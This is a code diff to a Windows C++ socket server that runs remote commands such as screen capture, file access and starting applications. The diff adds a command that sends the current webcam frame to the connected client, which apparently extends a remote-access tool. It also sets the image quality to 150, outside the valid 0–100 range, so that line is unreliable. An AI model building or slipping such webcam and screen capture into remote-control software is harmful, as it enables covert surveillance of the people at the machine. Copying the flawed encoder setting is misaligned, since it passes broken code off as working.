@@ -132,6 +132,8 @@ void Server::handleClient(SOCKET clientSocket) {
         } else if (strcmp(buffer, "stop webcam") == 0) {
             StopWebcam();
             wss << L"Webcam stopped.\n"; // TODO: Multithread
+        } else if (strcmp(buffer, "get webcam frame") == 0) {
+            wss << L"Webcam frame sent.\n";
         } else {
             wss << L"Unknown command.\n";
         }
@@ -172,6 +174,18 @@ void Server::handleClient(SOCKET clientSocket) {
                 break;
             }
             std::cout << "Sent image data of size: " << imageSize << " bytes" << std::endl;
+        } else if (strcmp(buffer, "get webcam frame") == 0) {
+            std::vector<char> frameData = GetWebcamFrame();
+
+            // Send frame size
+            int frameSize = frameData.size();
+            send(clientSocket, reinterpret_cast<char*>(&frameSize), sizeof(int), 0);
+
+            // Send frame data
+            if (!frameData.empty()) {
+                send(clientSocket, frameData.data(), frameData.size(), 0);
+                std::cout << "Sent webcam frame of size: " << frameSize << " bytes" << std::endl;
+            }
         }
     }
     closesocket(clientSocket);
@@ -359,7 +373,7 @@ std::vector<char> Server::ScreenCapture() {
     CreateStreamOnHGlobal(NULL, TRUE, &istream);
 
     Gdiplus::EncoderParameters encoderParameters;
-    ULONG quality = 75;
+    ULONG quality = 150;
     encoderParameters.Count = 1;
     encoderParameters.Parameter[0].Guid = Gdiplus::EncoderQuality;
     encoderParameters.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
@@ -429,6 +443,10 @@ void Server::ViewFile() {
 void Server::GetFile() {
     return;
 };
+
+std::vector<char> Server::GetWebcamFrame() {
+    return controller.GetCurrentFrame();
+}
 
 // Function to start an application and return its PID
 DWORD StartApplication(const std::wstring &applicationPath) {
